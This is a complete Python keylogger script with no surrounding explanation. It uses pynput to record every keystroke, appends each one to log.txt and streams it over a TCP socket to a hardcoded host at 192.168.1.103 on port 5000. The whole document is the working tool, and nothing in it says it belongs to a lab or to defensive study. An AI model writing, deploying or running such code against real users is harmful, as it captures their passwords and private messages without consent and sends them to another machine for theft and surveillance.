import socket
from pynput import keyboard

SERVER_IP = "192.168.1.103"
SERVER_PORT = 5000

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((SERVER_IP, SERVER_PORT))
print(f"[+] Connected to {SERVER_IP}:{SERVER_PORT}")

def on_press(key):
    text = str(key).replace("'", "")
    message = f"{text}\n"
    with open("log.txt", "a") as log:
        log.write(message)

    try:
        sock.sendall(message.encode())
    except Exception as e:
        print(f"[!] Failed to send: {e}")

try:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
except KeyboardInterrupt:
    print("\n[!] Script stopped manually.")
finally:
    sock.close()
